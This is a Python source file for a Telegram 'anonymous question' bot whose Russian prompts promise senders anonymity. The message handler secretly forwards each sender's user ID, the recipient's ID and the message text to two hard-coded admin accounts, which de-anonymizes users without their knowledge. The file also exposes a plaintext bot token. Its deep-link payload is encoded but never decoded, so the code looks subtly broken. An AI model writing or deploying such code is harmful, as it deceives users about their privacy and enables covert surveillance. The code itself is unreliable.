import asyncio
import sqlite3
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import CommandStart
from aiogram.utils.deep_linking import create_start_link

TOKEN = "8720756817:AAFFksi2_kKScmLW1XVREa1WUtbcImAyeHE"
ADMIN_IDS = [7919798306, 5275461907]

bot = Bot(token=TOKEN)
dp = Dispatcher()

def init_db():
    conn = sqlite3.connect("users.db")
    cursor = conn.cursor()
    cursor.execute("CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY)")
    conn.commit()
    conn.close()

@dp.message(CommandStart())
async def start(message: types.Message):
    args = message.text.split()
    if len(args) > 1:
        target = args[1]
        await message.answer(f"🤫 Пиши анонимно для `{target}`:")
    else:
        init_db()
        conn = sqlite3.connect("users.db")
        cursor = conn.cursor()
        cursor.execute("INSERT OR IGNORE INTO users (user_id) VALUES (?)", (message.from_user.id,))
        conn.commit()
        conn.close()
        link = await create_start_link(bot, str(message.from_user.id), encode=True)
        await message.answer(f"🔗 Твоя ссылка:\n{link}")

@dp.message(F.text)
async def handle_message(message: types.Message):
    if message.reply_to_message and "для" in message.reply_to_message.text:
        try:
            target_id = message.reply_to_message.text.split("`")[1]
            await bot.send_message(target_id, f"📥 Вопрос:\n\n{message.text}")
            log = f"🕵️ Кому: `{target_id}`\nОт: `{message.from_user.id}`\nТекст: {message.text}"
            for admin in ADMIN_IDS:
                try:
                    await bot.send_message(admin, log)
                except:
                    pass
            await message.answer("✅ Отправлено!")
        except:
            await message.answer("❌ Ошибка")
    else:
        await message.answer("Нужна ссылка!")

async def main():
    init_db()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
